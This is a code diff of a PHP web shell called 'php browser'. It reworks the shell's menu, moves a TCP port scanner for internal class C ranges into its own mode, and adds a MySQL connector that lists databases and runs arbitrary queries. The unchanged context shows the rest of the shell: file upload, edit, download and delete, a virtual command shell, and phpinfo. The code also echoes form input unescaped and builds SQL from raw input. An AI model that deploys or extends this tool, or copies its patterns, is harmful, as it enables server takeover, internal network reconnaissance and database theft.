@@ -69,14 +69,6 @@ if (!$chdir)
 
 $cwd = (IS_WIN ? str_replace('\\', '/', getcwd()) : getcwd());
 
-
-/* Display phpinfo */
-if (MODE == 'phpinfo')
-{
-	phpinfo();
-	die;
-}
-
 /* Download file */
 if (isset($_GET['d']) && isset($_GET['l']))
 {
@@ -107,12 +99,12 @@ if (isset($_POST['submit_file']))
 /* Edit file */
 if (isset($_GET['d']) && isset($_GET['e']))
 {
-		echo '<hr>[ Editing '. stripslashes($cwd .'/'. $_GET['e']) .' ] :<hr>
-		<form name="edit_file" method="post" action"'. SCRIPT_NAME . build_params() .'><textarea cols="130" rows="30" name="file_contents">'. 
-		file_get_contents($_GET['e']) .'</textarea><input type="hidden" name="filename" value="'. stripslashes($cwd .'/'. $_GET['e']) .'" />
-		<br><input type="submit" name="submit_file" value="Write to disk"/ >
-		</form>';
-		die;
+	echo '<hr>[ Editing '. stripslashes($cwd .'/'. $_GET['e']) .' ] :<hr>
+	<form name="edit_file" method="post" action"'. SCRIPT_NAME . build_params() .'><textarea cols="130" rows="30" name="file_contents">'. 
+	file_get_contents($_GET['e']) .'</textarea><input type="hidden" name="filename" value="'. stripslashes($cwd .'/'. $_GET['e']) .'" />
+	<br><input type="submit" name="submit_file" value="Write to disk"/ >
+	</form>';
+	die;
 }
 
 /* View file */
@@ -137,7 +129,19 @@ a.plus {font-weight: bold;color: #aaa;}
 a.linkdir {text-decoration: none;color: #55f;min-height: 32px;}
 a.menu {font-weight: bold;font-size: 11px;color: #55f;}</style>';
 
-// Display tree
+if (in_array(MODE, array('browser', 'portscan', 'mysql')))
+{
+	$id = (IS_WIN ? getenv('username') : get_current_user() .'@'. gethostname());
+
+	echo $html_header . $css . '<h4>php browser - '. $id .'</h4><p>'.
+	(MODE == 'browser' ? 'browser' : '<a href="'. SCRIPT_NAME .'?mode=browser'. build_params('mode') .'" class="menu">browser</a>') .' - '. 
+	(MODE == 'shell' ? 'shell' : '<a href="" onclick="javascript:window.open(\''. SCRIPT_NAME .'?mode=shell'. build_params('mode') .'\', \'\', \'width=820,height=385,toolbar=no,scrollbars=no\'); return false;" class="menu">shell</a>') .' - '.
+	(MODE == 'phpinfo' ? 'phpinfo' : '<a href="'. SCRIPT_NAME .'?mode=phpinfo'. build_params('mode') .'" class="menu">phpinfo</a>') .' - ' .
+	(MODE == 'portscan' ? 'portscan' : '<a href="'. SCRIPT_NAME .'?mode=portscan'. build_params(array('mode')) .'" class="menu">portscan</a>') .' - '.
+	(MODE == 'mysql' ? 'mysql' : '<a href="'. SCRIPT_NAME .'?mode=mysql'. build_params(array('mode')) .'" class="menu">mysql</a>'). '</p>';
+}
+
+/* Display tree */
 if (MODE == 'tree')
 {
 	echo $html_header . $css;
@@ -148,7 +152,7 @@ if (MODE == 'tree')
 	echo $html_footer;
 }
 
-// Display virtual shell
+/* Display virtual shell */
 if (MODE == 'shell')
 {
 	if (isset($_COOKIE['cs']))
@@ -220,19 +224,86 @@ if (MODE == 'shell')
 	echo $html_footer;
 }
 
-// Display file table
+/* Display port scanner */
+if (MODE == 'portscan')
+{
+	if (!isset($_POST['run_portscan']))
+	{
+		echo "<h5 style=\"font-size:14px;\">Port Scanner</h5>";
+		echo '<form action="" method="post">
+		Scan class C range : <input type=text name="class_c" value="192.168.0.1" size=12> - <input type="text" name="end" value="254" size=3><br><br><br>
+		<b>Do a TCP port scan on the specified range</b><br>
+		Scan the following ports (1 port or port range per line):<br>
+		<textarea cols=12 rows=12 name="portlist">'. "20-25\n80\n443-445\n1433\n3306\n3389" .'</textarea><br>
+		<input type="checkbox" name="show_closed" checked="checked"> Show closed ports
+		<input type="hidden" name="run_portscan" value="1" /><br>
+		<input type=submit name=submit value="Run TCP port scan"></form>';
+	}
+	else
+	{
+		set_time_limit(120);
+		
+		$class_c = explode('.', $_POST['class_c']);
+		$start = intval($class_c[3]);
+		$class_c = intval($class_c[0]) .'.'. intval($class_c[1]) .'.'. intval($class_c[2]) .'.';
+
+		$show_closed = (isset($_POST['show_closed']) and $_POST['show_closed'] == 'on' ? true : false);
+
+		$_POST['portlist'] = explode("\n", $_POST['portlist']);
+		$portlist = array();
+		
+		foreach ($_POST['portlist'] AS $port)
+		{
+			if (strpos($port, '-'))
+			{
+				$tab = explode('-', $port);
+				for ($i = intval($tab[0]); $i <= intval($tab[1]); $i++) $portlist[] = $i;
+			}
+			else $portlist[] = intval($port);
+		}
+		sort($portlist);
+
+		$services = get_services();
+
+		echo "<pre>";
+		for ($i = $start; $i <= intval($_POST['end']); $i++)
+		{
+			$host = $class_c.$i;
+
+			echo "portscan report for $host (". @gethostbyaddr($class_c.$i) ."):\n";
+			echo sprintf("%-10s", "PORT"). "  STATE\t". sprintf("%-15s", "SERVICE") ."\tHOST\n";
+
+			foreach ($portlist AS $port) {
+				$port = intval($port);
+				$svc = isset($services[$port]) ? $services[$port] : 'unknown';
+
+				$fp = @fsockopen($host,$port,$errno,$errstr,0.15);
+				if ($fp) stream_set_blocking($fp, 0);
+
+				if ($fp) {
+					echo sprintf("tcp/%-6s", $port) ."  open\t". sprintf("%-15s", $svc) ."\t$host\n";
+					fclose($fp);
+				}
+				elseif ($show_closed) echo sprintf("tcp/%-6s", $port) ."  closed\t". sprintf("%-15s", $svc) ."\t$host\n";
+				flush();
+			}
+			echo "\n";
+			flush();
+		}
+		echo "</pre>";
+	}
+}
+
+/* Display phpinfo */
+if (MODE == 'phpinfo')
+{
+	phpinfo();
+	die;
+}
+
+/* Display file browser */
 if (MODE == 'browser')
 {
-	$id = (IS_WIN ? getenv('username') : get_current_user() .'@'. gethostname());
-	
-	echo $html_header . $css . '<h4>php browser - '. $id .'</h4>';
-	echo '<p>'. ((MODE == 'browser' and !isset($_GET['portscan'])) ? 'browser' : 
-		'<a href="'. SCRIPT_NAME .'?mode=browser'. build_params('mode') .'" class="menu">browser</a>') .' - '. 
-		(MODE == 'shell' ? 'shell' : '<a href="" onclick="javascript:window.open(\''. SCRIPT_NAME .
-		'?mode=shell'. build_params('mode') .'\', \'\', \'width=820,height=385,toolbar=no,scrollbars=no\'); return false;" class="menu">shell</a>') .' - '.
-		(MODE == 'tools' ? 'tools' : '<a href="'. SCRIPT_NAME .'?mode=phpinfo'. build_params('mode') .'" class="menu">phpinfo</a>') .' - ' .
-		(isset($_GET['portscan']) ? 'portscan' : '<a href="'. SCRIPT_NAME .'?mode=browser&d='. $cwd .'&portscan=1'. build_params(array('mode', 'd', 'portscan')) .'" class="menu">portscan</a>') .'</p>';
-		
 	echo '<br><br>
 	<table height=700 border="0">
 	  <tr>
@@ -241,142 +312,147 @@ if (MODE == 'browser')
 	    </td>
 	    <td valign="top">';
 
-	if (isset($_GET['portscan'])) // Mode: portscan
+	if (IS_WIN) $cwd = str_replace('\\', '/', $cwd);
+	
+	echo '<table border="0">
+		  <tr><td colspan="7" style="padding-bottom: 20px;">ls -al '. utf8_decode($cwd) .'
+		  <br><form action="'. SCRIPT_NAME .'?mode=browser&d='. $cwd . build_params(array('mode', 'd')) .'" method="post" enctype="multipart/form-data" name="file_upload">
+		  <input name="uploaded_file" type="file" /><input type="submit" name="submit" value="Upload here" /></form>'. 
+		  (isset($uploaded) ? $uploaded : '') . (isset($deleted) ? $deleted : '') .'</td></tr>'. $lf;
+
+	if (!($list = @scandir('.'))) $list = false;
+
+	if ($list == false) echo '<tr><td colspan="7">Unable to read directory</td></tr>';
+
+	else foreach ($list as $key => $val)
 	{
-		if (!isset($_POST['run_portscan']))
+		$view = SCRIPT_NAME .'?mode=browser&d='. $cwd .'&v='. $val . build_params(array('mode', 'd', 'w'));
+		$edit = SCRIPT_NAME .'?mode=browser&d='. $cwd .'&e='. $val . build_params(array('mode', 'd', 'e'));
+		$down = SCRIPT_NAME .'?mode=browser&d='. $cwd .'&l='. $val . build_params(array('mode', 'd', 'l'));
+		$dele = SCRIPT_NAME .'?mode=browser&d='. $cwd .'&r='. $val . build_params(array('mode', 'd', 'r'));
+
+		if (function_exists('posix_getpwuid'))
 		{
-			echo "<h5 style=\"font-size:14px;\">Port Scanner</h5>";
-			echo '<form action="" method="post">
-			Scan class C range : <input type=text name="class_c" value="192.168.0.1" size=12> - <input type="text" name="end" value="254" size=3><br><br><br>
-			<b>Do a TCP port scan on the specified range</b><br>
-			Scan the following ports (1 port or port range per line):<br>
-			<textarea cols=12 rows=12 name="portlist">'. "20-25\n80\n443-445\n1433\n3306\n3389" .'</textarea><br>
-			<input type="checkbox" name="show_closed" checked="checked"> Show closed ports
-			<input type="hidden" name="run_portscan" value="1" /><br>
-			<input type=submit name=submit value="Run TCP port scan"></form>';
+			$owner = posix_getpwuid(@fileowner($val));
+			$group = posix_getgrgid(@filegroup($val));
 		}
-		else
+		else /* FIXME : need to do better :) */
 		{
-			set_time_limit(120);
-			
-			$class_c = explode('.', $_POST['class_c']);
-			$start = intval($class_c[3]);
-			$class_c = intval($class_c[0]) .'.'. intval($class_c[1]) .'.'. intval($class_c[2]) .'.';
-
-			$show_closed = (isset($_POST['show_closed']) and $_POST['show_closed'] == 'on' ? true : false);
-
-			$_POST['portlist'] = explode("\n", $_POST['portlist']);
-			$portlist = array();
-			
-			foreach ($_POST['portlist'] AS $port)
-			{
-				if (strpos($port, '-'))
-				{
-					$tab = explode('-', $port);
-					for ($i = intval($tab[0]); $i <= intval($tab[1]); $i++) $portlist[] = $i;
-				}
-				else $portlist[] = intval($port);
-			}
-			sort($portlist);
-
-			$services = get_services();
-
-			echo "<pre>";
-			for ($i = $start; $i <= intval($_POST['end']); $i++)
-			{
-				$host = $class_c.$i;
-
-				echo "portscan report for $host (". @gethostbyaddr($class_c.$i) ."):\n";
-				echo sprintf("%-10s", "PORT"). "  STATE\t". sprintf("%-15s", "SERVICE") ."\tHOST\n";
-
-				foreach ($portlist AS $port) {
-					$port = intval($port);
-					$svc = isset($services[$port]) ? $services[$port] : 'unknown';
-
-					$fp = @fsockopen($host,$port,$errno,$errstr,0.15);
-					if ($fp) stream_set_blocking($fp, 0);
-
-					if ($fp) {
-						echo sprintf("tcp/%-6s", $port) ."  open\t". sprintf("%-15s", $svc) ."\t$host\n";
-						fclose($fp);
-					}
-					elseif ($show_closed) echo sprintf("tcp/%-6s", $port) ."  closed\t". sprintf("%-15s", $svc) ."\t$host\n";
-					flush();
-				}
-				echo "\n";
-				flush();
-			}
-			echo "</pre>";
+			$owner = array('name' => @fileowner($val));
+			$group = array('name' => @filegroup($val));
 		}
+		$perms = getfperms($val);
+		$fsize = @filesize($val);
+		$mtime = @filemtime($val);
+
+		$is_dir = is_dir($val) ? true : false;
+		if ($is_dir)
+		{
+			$is_win_topdir = preg_match("![a-zA-Z]{1}:!", $cwd) ? true : false;
+
+			if ($val == '..')
+				$val = '<a href="'. SCRIPT_NAME .'?d='. substr($cwd, 0, strrpos($cwd, '/') + 
+				($is_win_topdir ? 1 : 0)) . build_params('d'). '">'. $val .'</a>';
+
+			elseif ($val == '.')
+				$val = '<a href="'. SCRIPT_NAME .'?d='. $cwd . build_params('d').'">'. $val .'</a>';
+
+			else
+				$val = '<a href="'. SCRIPT_NAME .'?mode=browser&d='. (substr($cwd, -1) != '/' ? $cwd : substr($cwd, 0, -1)) .'/'.
+				 urlencode($val) . build_params('mode', 'd') .'">'. $val .'</a>';
+		}
+	
+		echo '<tr style="height: 16px;"><td>'. $perms .'</td><td>'. $owner['name'] .'</td><td>'. $group['name'] .'</td>';
+		echo '<td>'. utf8_decode($val) .'</td><td align="right">'. $fsize .'</td><td>'. @date('Y/m/d H:i', $mtime) .'</td>';
+		echo '<td>'. (!$is_dir ? 
+			'<a target="_blank" title="View" href="'. $view .'"><img src="'. SCRIPT_NAME .'?genimg=view" alt="View" /></a> '.
+			'<a target="_blank" title="Edit" href="'. $edit .'"><img src="'. SCRIPT_NAME .'?genimg=edit" alt="Edit" /></a> '.
+			'<a title="Save" href="'. $down .'"><img src="'. SCRIPT_NAME .'?genimg=save" alt="Download" /></a> '.
+			'<a title="Delete" href="'. $dele .'"><img src="'. SCRIPT_NAME .'?genimg=delete" alt="Delete" /></a> ' : '&nbsp;');
+		echo '</td></tr>'. $lf;	
 	}
-
-	else // Mode: file browser
-	{
-		if (IS_WIN) $cwd = str_replace('\\', '/', $cwd);
-		
-		echo '<table border="0">
-			  <tr><td colspan="7" style="padding-bottom: 20px;">ls -al '. utf8_decode($cwd) .'
-			  <br><form action="'. SCRIPT_NAME .'?mode=browser&d='. $cwd . build_params(array('mode', 'd')) .'" method="post" enctype="multipart/form-data" name="file_upload">
-			  <input name="uploaded_file" type="file" /><input type="submit" name="submit" value="Upload here" /></form>'. 
-			  (isset($uploaded) ? $uploaded : '') . (isset($deleted) ? $deleted : '') .'</td></tr>'. $lf;
-	
-		if (!($list = @scandir('.'))) $list = false;
-
-		if ($list == false) echo '<tr><td colspan="7">Unable to read directory</td></tr>';
-
-		else foreach ($list as $key => $val)
-		{
-			$view = SCRIPT_NAME .'?mode=browser&d='. $cwd .'&v='. $val . build_params(array('mode', 'd', 'w'));
-			$edit = SCRIPT_NAME .'?mode=browser&d='. $cwd .'&e='. $val . build_params(array('mode', 'd', 'e'));
-			$down = SCRIPT_NAME .'?mode=browser&d='. $cwd .'&l='. $val . build_params(array('mode', 'd', 'l'));
-			$dele = SCRIPT_NAME .'?mode=browser&d='. $cwd .'&r='. $val . build_params(array('mode', 'd', 'r'));
-	
-			if (function_exists('posix_getpwuid'))
-			{
-				$owner = posix_getpwuid(@fileowner($val));
-				$group = posix_getgrgid(@filegroup($val));
-			}
-			else /* FIXME : need to do better :) */
-			{
-				$owner = array('name' => @fileowner($val));
-				$group = array('name' => @filegroup($val));
-			}
-			$perms = getfperms($val);
-			$fsize = @filesize($val);
-			$mtime = @filemtime($val);
-	
-			$is_dir = is_dir($val) ? true : false;
-			if ($is_dir)
-			{
-				$is_win_topdir = preg_match("![a-zA-Z]{1}:!", $cwd) ? true : false;
-
-				if ($val == '..')
-					$val = '<a href="'. SCRIPT_NAME .'?d='. substr($cwd, 0, strrpos($cwd, '/') + 
-					($is_win_topdir ? 1 : 0)) . build_params('d'). '">'. $val .'</a>';
-
-				elseif ($val == '.')
-					$val = '<a href="'. SCRIPT_NAME .'?d='. $cwd . build_params('d').'">'. $val .'</a>';
-
-				else
-					$val = '<a href="'. SCRIPT_NAME .'?mode=browser&d='. (substr($cwd, -1) != '/' ? $cwd : substr($cwd, 0, -1)) .'/'.
-					 urlencode($val) . build_params('mode', 'd') .'">'. $val .'</a>';
-			}
-		
-			echo '<tr style="height: 16px;"><td>'. $perms .'</td><td>'. $owner['name'] .'</td><td>'. $group['name'] .'</td>';
-			echo '<td>'. utf8_decode($val) .'</td><td align="right">'. $fsize .'</td><td>'. @date('Y/m/d H:i', $mtime) .'</td>';
-			echo '<td>'. (!$is_dir ? 
-				'<a target="_blank" title="View" href="'. $view .'"><img src="'. SCRIPT_NAME .'?genimg=view" alt="View" /></a> '.
-				'<a target="_blank" title="Edit" href="'. $edit .'"><img src="'. SCRIPT_NAME .'?genimg=edit" alt="Edit" /></a> '.
-				'<a title="Save" href="'. $down .'"><img src="'. SCRIPT_NAME .'?genimg=save" alt="Download" /></a> '.
-				'<a title="Delete" href="'. $dele .'"><img src="'. SCRIPT_NAME .'?genimg=delete" alt="Delete" /></a> ' : '&nbsp;');
-			echo '</td></tr>'. $lf;	
-		}
-		echo '</table>';
-	}
+	echo '</table>';
 
 	echo '</td></tr></table>'. $html_footer;
 
 	clearstatcache();
+}
+
+/* Display MySQL connector */
+if (MODE == 'mysql')
+{
+	echo "<h5 style=\"font-size:14px;\">MySQL connector</h5>";
+	echo '<form action="" method="post">
+	Database IP / Hostname <input type=text name="db_host" value="'. (isset($_POST['db_host']) ? $_POST['db_host'] : '127.0.0.1') .'" size="12">
+	Database User <input type="text" name="db_user" value="'. (isset($_POST['db_user']) ? $_POST['db_user'] : 'root') .'" size="10">
+	Database Pass <input type="password" name="db_pass" value="'. (isset($_POST['db_pass']) ? $_POST['db_pass'] : '') .'" size="10">
+	<input type="submit" name="db_list" value="List databases">';
+
+	if (isset($_POST['db_list']) or isset($_POST['db_run']))
+	{
+		$link = mysql_connect($_POST['db_host'], $_POST['db_user'], $_POST['db_pass']);
+
+		if (!$link)
+			echo '<span style="color: red">Error: '. mysql_error() .'</span>';
+		
+		else
+		{
+			$list_db = mysql_list_dbs($link);
+		
+			echo '<br>MySQL query in database <select name="db_name">';
+		
+			while ($db = mysql_fetch_assoc($list_db))
+				echo '<option value="'. $db['Database'] .'"'. ((isset($_POST['db_name']) AND $_POST['db_name'] == $db['Database']) ? ' selected="selected"' : '') .'>'. $db['Database'] .'</option>';
+			echo '</select> ';
+		
+			echo '<input type="text" name="db_query" value="'. (isset($_POST['db_query']) ? $_POST['db_query'] : 'select version()') .'" size="60" />
+			<input type="submit" name="db_run" value="Run" /><input type="submit" name="db_run" value="List tables" /><input type="submit" name="db_run" value="List columns" />';
+
+			if (isset($_POST['db_run']))
+			{
+				$db_name = stripslashes(strip_tags($_POST['db_name']));
+				if ($_POST['db_run'] == 'List tables')
+					$req = "SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='$db_name'";
+				elseif ($_POST['db_run'] == 'List columns')
+					$req = "SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='$db_name'";
+				else
+					$req = stripslashes(strip_tags($_POST['db_query']));
+				mysql_select_db($db_name, $link);
+				$res = mysql_query($req);
+				$cpt = mysql_num_rows($res);
+				$all = array('hdr' => array());
+
+				for ($i = 0; $row = mysql_fetch_assoc($res); $i++)
+				{
+					foreach ($row AS $key => $val)
+					{
+						if (!isset($all[$key]))
+							$all[$key] = array();
+						
+						array_push($all[$key], $val);
+						
+						if (max(strlen($key), strlen($val)) > $all['hdr'][$key])
+							$all['hdr'][$key] = max(strlen($key), strlen($val));
+					}
+				}
+				echo '<br><br><pre>';
+				$len = 0;
+				foreach ($all['hdr'] AS $key => $val)
+				{
+					echo sprintf("%-${val}s", $key) .' | ';
+					$len += $val + 3;
+				}
+				for ($i = 0; $i < $cpt; $i++)
+				{
+					echo "\n".sprintf("%'-${len}s", '-')."\n";
+					foreach ($all['hdr'] AS $key => $val) echo sprintf("%-${val}s", $all[$key][$i]) .' | ';
+				}
+				echo '</pre>';
+			}
+		}
+		mysql_close($link);
+	}
+	echo '</form>';
 }
 
 function p($data) { echo '<pre>'. print_r($data, true) .'</pre>'; }
